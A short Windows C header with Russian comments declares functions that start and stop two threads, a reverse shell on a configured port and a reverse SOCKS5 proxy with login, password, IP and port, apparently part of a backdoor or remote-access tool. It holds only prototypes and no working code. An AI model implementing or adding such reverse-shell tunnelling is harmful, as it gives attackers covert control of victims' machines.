#ifndef PROXY_H
#define PROXY_H

#include <windows.h>

/**
 * Запускает в двух потоках:
 * - reverse shell на порту RSHELL_PORT
 * - reverse SOCKS5 на конфигурации (логин, пароль, IP, порт)
 */
HANDLE Proxy_Start(void);

/**
 * Останавливает работу
 */
void Proxy_Stop(HANDLE shellThread);

#endif // PROXY_H
